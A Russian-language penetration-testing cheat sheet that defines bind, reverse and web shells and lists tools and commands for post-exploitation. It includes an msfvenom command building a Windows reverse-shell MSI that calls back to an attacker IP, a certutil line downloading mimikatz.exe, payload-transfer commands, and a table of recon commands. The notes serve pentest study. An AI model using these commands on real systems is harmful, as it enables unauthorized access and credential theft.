- Оболочка (shell) - пользовательский интерфейс, предоставляющий доступ к службам операционной системы. Она может быть основана на командной строке (bash, zsh в Linux, PowerShell, CMD в Windows) или иметь графический интерфейс. В контексте атакующей безопасности оболочка - командная оболочка, позволяющая атакующему выполнять команды в системе. 
- Прямая/привязанная оболочка (bind shell) - это тип удалённой оболочки, при котором целевая машина (жертва) открывает сетевой порт и «привязывает» к этому порту командную оболочку . Затем атакующий подключается к этому порту со своей машины, чтобы получить интерактивный доступ к командной строке целевой системы.
- Обратная оболочка (reverse shell) - это тип оболочки, при котором скомпрометированная машина инициирует обратное соединение с машиной злоумышленника (машина подключается к машине атакующего). Обратные оболочки обычно используются для обхода ограничений межсетевого экрана (многие брандмауэры блокируют входящие соединения, но разрешают исходящий трафик).
- Веб-оболочка (web shell) - это вредоносный скрипт, позволяющий атакующему выполнять произвольные команды на удалённом веб-сервере, просто отправляя HTTP-запросы на нужную конечную точку.

## Инструменты
- Генератор реверс шеллов: https://www.revshells.com/
- [Msfvenom](https://kali.tools/?p=3627) (генерация полезных нагрузок с шеллами):
	1. `msfvenom --platform windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.16 LPORT=443 -f msi -o rev.msi` 
	2. Поставить хэндлер в msfconsole: https://habr.com/ru/articles/272547/
- [evil-winrm](https://github.com/Hackplayers/evil-winrm): `evil-winrm -i <ip> -u <username> -p <password>`
## Скачивание нагрузок на хост
- ### Linux
	- wget: `wget <host:port>/<file path>`
	- curl: `curl <host:port>/<file path> -O
	- Передача данных через SSH: `scp <file> <user>@<target>:<path>`
- ### Windows
	- `certutil -urlcache -split -f http://<host>/mimikatz.exe m.exe`
## Неинтерактивная и интерактивная оболочки (шеллы)
- Основное ограничение неинтерактивной оболочки - её нельзя использовать для выполнения многоступенчатых команд , требующих взаимодействия с программой, запускаемой из вашей команды. Пример: `sudo apt install xyz`. Выполнение такой команды приведет к тому, что программа `apt` ответит и предложит вам ввести yes (да) или no (нет) перед установкой пакета. Такое поведение невозможно при использовании неинтерактивной ­оболочки, поэтому что вам необходимо структурировать команду таким образом, чтобы не требовать взаимодействия с пользователем. Пример: `sudo apt install xyz –y`, она будет работать нормально. 
- Команды операционной системы, подходящие для неинтерактивных оболочек:

| Назначение                      | Windows                           | Linux/UNIX/Mac                |
|:------------------------------- | --------------------------------- | ----------------------------- |
| Информация об IP-адресе         | `ipconfig /all`                   | `ifconfig`                    |
| Список активных процессов       | `tasklist /v`                     | `ps aux`                      |
| Переменные окружения            | `set`                             | `export`                      |
| Список файлов текущего каталога | `dir /ah`                         | `ls -lah`                     |
| Просмотр содержимого            | `type <file>`                     | `cat <file>`                  |
| Копирование файла               | `copy <src> <dest>`               | `cp <src> <dest>`             |
| Поиск файла или строки          | `type <file> \| find /I <string>` | `cat <file> \| grep <string>` |
